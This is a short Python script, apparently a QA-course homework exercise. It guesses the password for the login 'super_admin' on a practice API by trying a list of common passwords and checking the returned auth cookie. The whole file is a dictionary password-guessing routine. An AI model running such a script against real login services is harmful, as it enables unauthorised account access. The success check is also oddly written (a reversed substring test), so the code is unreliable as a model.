import requests

login = "super_admin"
passwords = [123456, 123456789, "qwerty", "password", 1234567, 12345678, 12345, "iloveyou", 111111, 123123, "abc123",
             "qwerty123", "1q2w3e4r", "admin", "qwertyuiop", 654321, 555555, "lovely", 7777777, "welcome", 888888,
             "princess", "dragon", "password1", "123qwe"]

for password in passwords:
    data = {"login": login,
            "password": password}
    response_get_pass = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=data)
    cookie = response_get_pass.headers["Set-Cookie"].split(";")
    response_check_pass = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie",
                                        headers={"cookie": cookie[0]})
    if response_check_pass.text in "You are authorized":
        print("Password is", password)
        break
